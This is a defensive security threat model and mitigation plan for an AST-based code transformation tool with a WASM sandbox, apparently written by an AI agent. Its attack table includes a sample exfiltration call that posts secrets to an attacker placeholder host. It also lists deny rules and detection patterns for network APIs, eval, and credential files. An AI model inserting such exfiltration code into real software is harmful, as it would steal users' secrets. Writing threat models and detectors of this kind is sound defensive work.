# Agent Booster AST Redesign: Security Threat Model & Mitigation Strategy

**Author**: security-manager agent (Task #12)
**Date**: 2026-03-20
**Status**: Complete
**Scope**: AST-based Agent Booster with WASM runtime, multi-language support

---

## Executive Summary

The AST-based Agent Booster redesign introduces a code transformation pipeline that accepts
transform instructions and executes them via AST manipulation in WASM. This is a **code
modification tool operating on user source code** -- security is paramount. This document
identifies 10 threat categories, maps them to the existing `@claude-flow/security` module,
and provides concrete mitigation strategies.

**Risk Rating**: HIGH -- the system modifies production source code. A compromised transform
can inject backdoors, exfiltrate data, or introduce vulnerabilities.

---

## 1. Code Injection via Transform Instructions

### Threat

A malicious or compromised transform instruction could:
- Inject data exfiltration calls disguised as "logging" (e.g., `console.log` that POSTs to
  an external server)
- Add backdoor authentication bypasses
- Insert eval()/Function()/import() of remote code
- Modify security-sensitive code (auth, crypto, access control) in subtle ways

### Attack Vectors

| Vector | Example | Severity |
|--------|---------|----------|
| Instruction poisoning | "Add logging" instruction that inserts `fetch('https://evil.com', {body: secrets})` | CRITICAL |
| Semantic drift | "Add error handling" that catches and silently swallows auth failures | HIGH |
| Indirect injection | Transform instruction references external template containing malicious code | HIGH |
| Chained transforms | Multiple benign-looking transforms that combine into a malicious result | MEDIUM |

### Mitigations

1. **Closed instruction vocabulary**: Transform instructions MUST map to a finite set of
   AST operations (rename, wrap-in-try-catch, add-type-annotation, etc.). Free-form code
   injection through instructions is prohibited. The DSL should be declarative, not imperative.

2. **Output AST validation**: After every transform, run a post-transform AST diff validator
   that checks:
   - No new `CallExpression` nodes targeting network APIs (`fetch`, `XMLHttpRequest`,
     `http.request`, `net.Socket`, `WebSocket`, `child_process`)
   - No new `eval()`, `Function()`, `new Function()`, `import()` dynamic evaluation
   - No new string literals matching URL/IP patterns
   - No new `require()` of modules not already imported

3. **Semantic equivalence checking**: For "safe" transforms (rename, format, add types),
   verify the transform is purely structural:
   - Rename: only `Identifier` nodes changed, all references updated
   - Add types: only `TypeAnnotation` nodes added, no runtime code changed
   - Format: only whitespace/trivia changed, AST structure identical

4. **Integration with `@claude-flow/security` InputValidator**: Validate all transform
   instruction strings through `InputValidator.validate(TransformInstructionSchema, input)`
   using a Zod schema that rejects shell metacharacters, embedded code, and suspicious patterns.

---

## 2. WASM Sandbox Security

### Threat

WASM language provider modules run in the WASM sandbox. If the sandbox is misconfigured or
if WASI capabilities are too broad, a malicious WASM module could:
- Read sensitive files (credentials, .env, private keys)
- Write to the filesystem (plant backdoors outside the transform target)
- Make network calls (exfiltrate code or download payloads)
- Access environment variables (API keys, secrets)

### WASM Security Properties (Baseline)

WASM provides strong isolation by default:
- **Memory isolation**: WASM modules cannot access host memory
- **No filesystem access**: Unless explicitly granted via WASI
- **No network access**: Unless explicitly granted via WASI
- **No environment variable access**: Unless explicitly passed
- **Deterministic execution**: Same inputs produce same outputs (barring WASI calls)

### Recommended WASI Capability Policy

| Capability | Policy | Rationale |
|------------|--------|-----------|
| `fd_read` | ALLOW (scoped) | Read only the specific input file being transformed |
| `fd_write` | ALLOW (scoped) | Write only to a designated output buffer, never to disk |
| `path_open` | DENY | No opening arbitrary files |
| `path_filestat_get` | DENY | No stat-ing the filesystem |
| `environ_get` | DENY | No access to environment variables |
| `environ_sizes_get` | DENY | No enumeration of environment |
| `sock_accept/recv/send` | DENY | No network access |
| `clock_time_get` | ALLOW | Needed for performance measurement only |
| `proc_exit` | ALLOW | Clean shutdown |
| `random_get` | DENY | No cryptographic operations (transforms are deterministic) |
| `args_get` | ALLOW (sanitized) | Only transform instruction parameters, validated |

### Implementation

```typescript
// WASM capability policy for language providers
interface WasiCapabilityPolicy {
  // Only allow reading from a pre-mapped virtual directory containing the input file
  preopenDirs: Map<string, string>; // virtual_path -> real_path (read-only)

  // No environment variables passed to WASM
  env: Record<string, never>;

  // Arguments: only the serialized transform instruction (validated)
  args: string[];

  // Explicit deny list
  deny: ['sock_accept', 'sock_recv', 'sock_send', 'path_open', 'environ_get'];
}
```

The host runtime (Node.js / Deno) should use a WASI implementation that supports
capability-based security (e.g., `@aspect-build/aspect-wasi`, `wasmer-js`, or
`wasmtime` bindings with explicit capability grants).

---

## 3. Supply Chain Risks for Language WASM Modules

### Threat

Language provider WASM modules (tree-sitter grammars, compiled `syn` crate, TypeScript
compiler WASM build) come from external sources. A compromised module could:
- Contain malicious code that runs during AST parsing
- Return manipulated AST structures that introduce vulnerabilities
- Be replaced by an attacker via a dependency confusion attack

### Mitigations

1. **Content-addressed loading**: Reference WASM modules by content hash (SHA-256), not by
   name or URL. The system refuses to load a module whose hash does not match the expected
   value:
   ```typescript
   interface LanguageProviderManifest {
     name: string;
     version: string;
     wasmHash: string;        // SHA-256 of the .wasm binary
     wasmSize: number;        // Expected size in bytes
     sourceUrl: string;       // Where to fetch (informational only)
     buildReproducible: boolean; // Whether the build is reproducible
     buildInstructions?: string; // How to reproduce the build
   }
   ```

2. **Signed manifests**: The provider manifest should be signed by a trusted key. The
   Agent Booster verifies the signature before loading any WASM module:
   ```typescript
   interface SignedManifest extends LanguageProviderManifest {
     signature: string;       // Ed25519 signature of the manifest
     signerPublicKey: string; // Public key of the signer
   }
   ```

3. **Trusted registry**: Ship known-good WASM modules with the `@claude-flow/cli` package
   itself (first-party). Third-party modules require explicit user approval and hash
   verification.

4. **Reproducible builds**: Where possible, provide build instructions so users can
   independently verify the WASM binary matches the source (especially for tree-sitter
   grammars and compiled Rust crates).

5. **Vendoring over fetching**: Default to vendored (bundled) WASM modules. Remote fetch
   is opt-in and requires explicit `--allow-remote-wasm` flag.

---

## 4. Transform Output Validation

### Threat

Even with a legitimate WASM module and valid instructions, the transform output could
contain dangerous patterns due to bugs, edge cases, or subtle instruction misinterpretation.

### Post-Transform Security Scan

After every transform, before applying to the user's file, run these checks:

| Check | Implementation | Blocks |
|-------|---------------|--------|
| No new network calls | AST scan for `fetch`, `http.*`, `net.*`, `WebSocket`, `XMLHttpRequest` | Data exfiltration |
| No new filesystem access | AST scan for `fs.*`, `readFile`, `writeFile`, `open` | Unauthorized file access |
| No eval/dynamic execution | AST scan for `eval`, `Function`, `import()`, `require()` (new) | Code injection |
| No hardcoded secrets | Regex scan for API key patterns, JWT tokens, private keys | Secret exposure |
| No new imports | Diff check: output imports subset-of-or-equal-to input imports | Dependency injection |
| No removed security code | Diff check: security-critical patterns not deleted | Security weakening |
| Syntax validity | Parse output with same language parser | Corruption |
| Type safety (TS) | Run `tsc --noEmit` on output if TypeScript | Type regression |

### Implementation Pattern

```typescript
interface TransformOutputValidator {
  validate(input: string, output: string, language: string): ValidationResult;
}

interface ValidationResult {
  safe: boolean;
  warnings: SecurityWarning[];
  blockers: SecurityBlocker[];  // Must be empty to proceed
  diff: UnifiedDiff;
}

interface SecurityWarning {
  severity: 'low' | 'medium' | 'high';
  category: string;
  message: string;
  line: number;
  column: number;
}

interface SecurityBlocker {
  category: 'network' | 'filesystem' | 'eval' | 'secrets' | 'imports' | 'security-removal';
  message: string;
  evidence: string;    // The offending code
  line: number;
}
```

---

## 5. Diff-Based Review (Ultimate Security Gate)

### Design

The diff is the final human-readable security gate. No transform should be applied without
the user having the opportunity to review what changed.

### Modes

| Mode | Behavior | Use Case |
|------|----------|----------|
| `mandatory-review` (default) | Show diff, require explicit approval | Interactive development |
| `auto-approve-safe` | Auto-approve "safe" transforms (rename, format, add-types), show diff for others | Trusted automated pipelines |
| `auto-approve-all` | Auto-approve everything (log only) | CI/CD with post-hoc audit |

### Safe Transform Categories (auto-approvable)

These transforms are provably safe because they do not change runtime behavior:
- `rename-identifier`: Only changes names, all references updated
- `format`: Only whitespace/trivia changes
- `add-type-annotation`: TypeScript-only, adds type info, no runtime effect
- `add-comment`: Only adds comments, no code changes
- `remove-unused-import`: Removes dead code only

All other transforms require review in `auto-approve-safe` mode.

### Diff Presentation

```
[Agent Booster] Transform: add-error-handling
File: src/api/auth.ts
Instruction: Wrap async functions in try-catch with typed errors

--- a/src/api/auth.ts
+++ b/src/api/auth.ts
@@ -15,7 +15,12 @@
 export async function authenticate(token: string): Promise<User> {
-  const decoded = await jwt.verify(token, SECRET);
-  return await db.users.findOne({ id: decoded.sub });
+  try {
+    const decoded = await jwt.verify(token, SECRET);
+    return await db.users.findOne({ id: decoded.sub });
+  } catch (error) {
+    if (error instanceof jwt.TokenExpiredError) {
+      throw new AuthenticationError('Token expired', { cause: error });
+    }
+    throw new AuthenticationError('Authentication failed', { cause: error });
+  }
 }

[Security] No new network calls, no new imports, no eval/dynamic code.
[Apply? y/n/edit]
```

### Integration Point

The diff review integrates with the existing `post-edit` hook system:
```bash
npx @claude-flow/cli hooks post-edit --file "src/api/auth.ts" --transform-diff true
```

---

## 6. Resource Limits (DoS Prevention)

### Threat

A malicious or buggy transform instruction could:
- Cause infinite loops in the WASM module (hang the process)
- Allocate excessive memory (crash the process)
- Request transforms on enormous files (exhaust resources)
- Submit massive batches of transforms (overwhelm the system)

### Resource Limits

| Resource | Limit | Enforcement |
|----------|-------|-------------|
| WASM execution time | 5 seconds per transform | WASM runtime `setTimeout` / fuel metering |
| WASM memory | 256 MB per module | WASM `Memory` max pages (4096 pages x 64KB) |
| Input file size | 1 MB (configurable) | Pre-check before loading into WASM |
| Output file size | 2x input size | Post-check after transform |
| Transform batch size | 100 instructions per batch | Instruction count limit |
| Concurrent transforms | 4 parallel WASM instances | Semaphore/pool |
| Total session transforms | 1000 per session | Session counter |
| AST node count | 100,000 nodes per file | Pre-check after parsing |

### WASM Fuel Metering

Use WASM fuel/gas metering to prevent infinite loops:
```typescript
interface WasmExecutionLimits {
  fuelLimit: number;        // Max WASM instructions (e.g., 10_000_000)
  memoryPagesMax: number;   // Max 64KB pages (e.g., 4096 = 256MB)
  timeoutMs: number;        // Hard timeout (e.g., 5000ms)
  stackSizeBytes: number;   // Max stack size (e.g., 1MB)
}
```

### Alignment with Existing Security

The existing `SafeExecutor` in `@claude-flow/security` already implements timeout controls
(`config.timeout`) and resource limits (`config.maxBuffer`). The Agent Booster WASM runtime
should follow the same pattern:
- Configurable limits with safe defaults
- Hard enforcement (not advisory)
- Clear error messages when limits are exceeded

---

## 7. Reversibility

### Threat

If a transform introduces a bug or security issue, the user must be able to undo it
immediately and completely.

### Reversibility Strategy

1. **Pre-transform snapshot**: Before applying any transform, store the original file content
   in a temporary location:
   ```
   .claude/agent-booster/snapshots/{timestamp}_{file_hash}_{filename}
   ```

2. **Reverse transform instructions**: For each transform type, generate the inverse
   operation:
   | Forward | Reverse |
   |---------|---------|
   | `rename(a, b)` | `rename(b, a)` |
   | `add-type-annotation(fn, type)` | `remove-type-annotation(fn)` |
   | `wrap-in-try-catch(fn)` | `unwrap-try-catch(fn)` |
   | `add-error-handling(fn)` | Restore from snapshot (no AST inverse) |

3. **Git integration**: Transforms should work with git:
   - Check if the working directory is clean before applying transforms
   - If dirty, warn the user and suggest committing first
   - After applying, the user can `git diff` and `git checkout -- file` to revert

4. **Undo stack**: Maintain a session-level undo stack of applied transforms:
   ```typescript
   interface TransformUndoEntry {
     transformId: string;
     filePath: string;
     originalContent: string;
     originalHash: string;
     appliedAt: Date;
     instruction: TransformInstruction;
   }
   ```

5. **Batch undo**: For batch transforms, provide `undo-batch` to revert all transforms
   in a batch atomically.

---

## 8. Integration with @claude-flow/security

### Existing Security Components

The `@claude-flow/security` module (v3.0.0-alpha.1) provides:

| Component | Agent Booster Integration |
|-----------|--------------------------|
| `PathValidator` | Validate all file paths before transforms. Use `createFullProjectPathValidator(projectRoot)` to ensure transforms only target files within the project. Prevents path traversal attacks in transform instructions. |
| `InputValidator` | Validate transform instruction strings through `SafeStringSchema` to reject shell metacharacters. Create a `TransformInstructionSchema` Zod schema for structured validation. |
| `SafeExecutor` | If transforms invoke any external tools (linters, formatters), route through `SafeExecutor` with an allowlist. The WASM runtime itself does not need `SafeExecutor` (it runs in-process). |
| `sanitizePath()` | Sanitize file paths in transform instructions before resolution. |
| `sanitizeString()` | Sanitize instruction text before passing to WASM. |

### New Schemas for Agent Booster

```typescript
import { z } from 'zod';
import { IdentifierSchema, PathSchema } from '@claude-flow/security';

// Transform instruction schema
export const TransformInstructionSchema = z.object({
  type: z.enum([
    'rename-identifier', 'add-type-annotation', 'remove-type-annotation',
    'wrap-in-try-catch', 'unwrap-try-catch', 'add-error-handling',
    'convert-var-to-const', 'convert-to-async-await', 'add-logging',
    'remove-console', 'add-jsdoc', 'extract-function', 'inline-function',
  ]),
  target: z.object({
    file: PathSchema,
    identifier: IdentifierSchema.optional(),
    line: z.number().int().positive().optional(),
    scope: z.enum(['function', 'class', 'module', 'block']).optional(),
  }),
  parameters: z.record(z.string()).optional(),
});

// Batch transform schema
export const TransformBatchSchema = z.object({
  instructions: z.array(TransformInstructionSchema).max(100),
  reviewMode: z.enum(['mandatory-review', 'auto-approve-safe', 'auto-approve-all'])
    .default('mandatory-review'),
  dryRun: z.boolean().default(false),
});
```

### CVE Registry Integration

Add new entries to `CVE-REMEDIATION.ts` for Agent Booster security:

```typescript
{
  id: 'AB-1',
  title: 'Transform Instruction Injection',
  severity: 'high',
  description: 'Unvalidated transform instructions could inject malicious code',
  remediationFile: 'v3/security/transform-validator.ts',
  remediationStatus: 'in_progress',
}
```

---

## 9. Audit Logging

### Requirements

Every transform operation MUST be logged with sufficient detail for forensic analysis
and compliance auditing.

### Log Entry Schema

```typescript
interface TransformAuditEntry {
  // Identity
  transformId: string;          // UUID
  batchId: string | null;       // UUID if part of a batch
  sessionId: string;            // Session identifier
  agentId: string;              // Agent that requested the transform
  userId: string | null;        // Human user if interactive

  // Timing
  timestamp: string;            // ISO 8601
  durationMs: number;           // Execution time

  // Transform details
  instruction: {
    type: string;               // Transform type enum value
    parameters: Record<string, string>;
  };
  filePath: string;             // Validated absolute path
  language: string;             // Language of the file

  // Integrity
  inputHash: string;            // SHA-256 of input file
  outputHash: string;           // SHA-256 of output file
  diffSize: number;             // Number of lines changed

  // Security
  securityScanResult: 'pass' | 'warn' | 'block';
  securityWarnings: string[];
  reviewMode: string;           // mandatory-review | auto-approve-safe | auto-approve-all
  userApproved: boolean | null; // null if auto-approved

  // Outcome
  status: 'applied' | 'rejected' | 'reverted' | 'error';
  errorMessage?: string;
}
```

### Storage

- Audit logs stored in the AgentDB memory system under namespace `agent-booster/audit`
- Retention: configurable, default 90 days
- Searchable by file path, transform type, agent, time range
- Exportable for compliance (JSON, CSV)

### Integration

Hook into the existing hooks system:
```bash
npx @claude-flow/cli hooks post-task \
  --task-id "transform-{id}" \
  --success true \
  --store-results true
```

---

## 10. Privilege Model

### Transform Privilege Levels

| Level | Description | Transforms | Review Required | Auto-Approvable |
|-------|-------------|------------|-----------------|-----------------|
| **LOW** (safe) | No runtime behavior change | rename, format, add-comment, add-type-annotation, remove-unused-import | No (in auto-approve-safe mode) | Yes |
| **MEDIUM** (behavior) | Changes runtime behavior but not security-sensitive | add-error-handling, convert-var-to-const, convert-to-async-await, extract-function | Yes (unless auto-approve-all) | No |
| **HIGH** (security-sensitive) | Modifies auth, crypto, access control, or data handling | Any transform touching files in `auth/`, `security/`, `crypto/` paths; any transform that adds/removes network calls or file system access | Always | Never |

### Privilege Escalation Prevention

1. **File-based classification**: Files matching these patterns are automatically classified
   as HIGH privilege targets:
   - `**/auth/**`, `**/security/**`, `**/crypto/**`
   - `**/*.key`, `**/*.pem`, `**/*.cert`
   - Files containing `password`, `secret`, `token`, `credential` in identifiers
   - Configuration files (`.env*`, `*.config.*`)

2. **Instruction-based classification**: Even for non-sensitive files:
   - Any instruction that adds imports is at least MEDIUM
   - Any instruction that modifies function signatures is at least MEDIUM
   - Any instruction that touches `try/catch` around auth code is HIGH

3. **Context-based escalation**: If a transform modifies a function that is called by
   security-sensitive code (requires call graph analysis in future versions), escalate
   the privilege level.

### Enforcement

```typescript
interface PrivilegeCheck {
  requiredLevel: 'low' | 'medium' | 'high';
  actualLevel: 'low' | 'medium' | 'high';
  fileSensitivity: 'normal' | 'sensitive' | 'critical';
  allowed: boolean;
  requiresReview: boolean;
  reason: string;
}
```

---

## Threat Summary Matrix

| # | Threat | Severity | Likelihood | Mitigation | Existing Security Integration |
|---|--------|----------|------------|------------|-------------------------------|
| 1 | Code injection via instructions | CRITICAL | MEDIUM | Closed vocabulary, output validation, semantic checks | `InputValidator`, `SafeStringSchema` |
| 2 | WASM sandbox escape | LOW | LOW | Minimal WASI capabilities, deny-by-default | New: `WasiCapabilityPolicy` |
| 3 | Supply chain compromise | HIGH | LOW | Content-addressed loading, signed manifests, vendoring | New: `LanguageProviderManifest` |
| 4 | Unsafe transform output | HIGH | MEDIUM | Post-transform security scan (network, eval, secrets) | `sanitizeString()`, new: `TransformOutputValidator` |
| 5 | Unreviewed changes | MEDIUM | MEDIUM | Mandatory diff review, opt-out for trusted pipelines | `post-edit` hook integration |
| 6 | Resource exhaustion (DoS) | MEDIUM | MEDIUM | Time/memory/file limits, fuel metering | `SafeExecutor` timeout pattern |
| 7 | Irreversible damage | MEDIUM | LOW | Pre-transform snapshots, undo stack, git integration | Git working tree checks |
| 8 | Path traversal | HIGH | MEDIUM | Path validation before all file operations | `PathValidator` (existing, direct reuse) |
| 9 | Missing audit trail | MEDIUM | HIGH | Structured audit logging to AgentDB | `post-task` hook, AgentDB memory |
| 10 | Privilege escalation | HIGH | LOW | File/instruction/context-based privilege classification | New: `PrivilegeCheck` |

---

## Implementation Priority

### Phase 1 (Must-have for MVP)

1. **PathValidator integration** -- Direct reuse of existing `@claude-flow/security` PathValidator
2. **InputValidator integration** -- Create `TransformInstructionSchema` Zod schema
3. **Mandatory diff review** -- Show diff before applying any transform
4. **WASM resource limits** -- Timeout (5s), memory (256MB), file size (1MB)
5. **Pre-transform snapshots** -- Store original file content before transform
6. **Post-transform security scan** -- Check for network calls, eval, secrets

### Phase 2 (Required before production)

7. **Content-addressed WASM loading** -- SHA-256 hash verification
8. **Audit logging** -- Structured logs to AgentDB
9. **Privilege model** -- File-based sensitivity classification
10. **WASI capability lockdown** -- Deny-by-default policy

### Phase 3 (Hardening)

11. **Signed manifests** -- Ed25519 signature verification for WASM modules
12. **Semantic equivalence checking** -- For safe transforms (rename, format)
13. **Call graph analysis** -- Context-based privilege escalation
14. **WASM fuel metering** -- Instruction count limits for infinite loop prevention

---

## Conclusion

The Agent Booster AST redesign introduces a powerful but security-sensitive capability.
The existing `@claude-flow/security` module provides a strong foundation with `PathValidator`,
`InputValidator`, `SafeExecutor`, and `sanitize*` functions that directly apply to the
Agent Booster use case. The key new security components needed are:

1. A **transform instruction validator** (Zod schema, closed vocabulary)
2. A **WASI capability policy** (deny-by-default for WASM modules)
3. A **post-transform security scanner** (AST-level checks for dangerous patterns)
4. A **mandatory diff review gate** (human-in-the-loop before applying)
5. An **audit logging system** (structured, searchable, exportable)
6. A **privilege model** (low/medium/high based on file sensitivity and instruction type)

With these mitigations in place, the Agent Booster can safely transform code at sub-millisecond
speeds while maintaining the security guarantees users expect from production tooling.
